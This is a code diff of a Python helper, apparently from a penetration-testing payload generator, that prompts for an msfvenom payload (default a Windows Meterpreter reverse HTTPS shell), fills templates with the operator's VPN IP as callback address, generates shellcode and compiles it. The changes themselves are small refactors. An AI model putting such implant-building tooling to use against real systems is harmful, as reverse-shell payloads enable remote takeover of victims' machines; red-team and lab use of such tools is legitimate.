@@ -8,10 +8,11 @@ def get_tun0_ip():
     try:
         result = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True, check=True)
     except subprocess.CalledProcessError as e:
-        result = subprocess.run(['ip', 'addr', 'show', 'eth0'], capture_output=True, text=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"No eth0 or tun0 found. Giving default IP of 192.168.1.1: {e}")
-        return "192.168.1.1"
+        try:
+            result = subprocess.run(['ip', 'addr', 'show', 'eth0'], capture_output=True, text=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"No eth0 or tun0 found. Giving default IP of 192.168.1.1: {e}")
+            return "192.168.1.1"
     output_lines = result.stdout.splitlines()
     for line in output_lines:
         if 'inet' in line:
@@ -22,8 +23,6 @@ def get_tun0_ip():
 
 
 def Call_Msfvenom(plFormat):
-    print("here")
-    
     payload = input("Enter msfvenom payload. Default value is [windows/x64/meterpreter/reverse_https]")
     if payload == "":
         payload = "windows/x64/meterpreter/reverse_https"
@@ -73,12 +72,8 @@ def FillTemplate(template):
             if "[[[[ownIP]]]]" in defaultValue:
                 defaultValue = defaultValue.replace("[[[[ownIP]]]]",get_tun0_ip())
             
-            print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Enter value, press enter for default, or !describe! to print description.")
+            print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Description {description}.")
             choice = input("> ")
-            if choice == "!describe!":
-                print(description)
-                print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Enter value, press enter for default.")
-                choice = input("> ")           
             if choice == "":
                 choice = defaultValue
             if name in templateValues:
@@ -101,12 +96,8 @@ def FillTemplate(template):
                     if "[[[[ownIP]]]]" in defaultValue:
                         defaultValue = defaultValue.replace("[[[[ownIP]]]]",get_tun0_ip())
 
-                    print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Enter value, press enter for default, or !describe! to print description.")
+                    print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Description {description}.")
                     choice = input("> ")
-                    if choice == "!describe!":
-                        print(description)
-                        print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Enter value, press enter for default.")
-                        choice = input("> ")           
                     if choice == "":
                         choice = defaultValue
                     if name in templateValues:
@@ -124,7 +115,8 @@ def FillTemplate(template):
                 profileProtocol = templateValues["profileProtocol"]
                 profileArchitecture = templateValues["profileArchitecture"]
                 profileName = templateValues["profileName"]
-                shellCode = ep_gensc.GetSliverShellCode(payload, lhost, lport, plFormat, profileProtocol, profileArchitecture, profileName)
+                print("This needs to be rewritten see line 126 of ep_templater")
+                #shellCode = ep_gensc.GetSliverShellCode(payload, lhost, lport, plFormat, profileProtocol, profileArchitecture, profileName)
             else: 
                 print("Unrecognised [shellCodeType]. Exiting")
                 exit();
@@ -158,9 +150,11 @@ def FillTemplate(template):
         ep_compile.compile(template["compilation"], content)
     
     if "runHint" in template:
+        print("===========================================================")
         print("Run hint:")
         print(template["runHint"].replace("[[[[ownIP]]]]",get_tun0_ip()))
+        print("===========================================================")
 
-    printtheguy = input("Print final payload? N/y.")
+    printtheguy = input("Print final payload? N/y>")
     if printtheguy.lower() == "y":
         print(content)
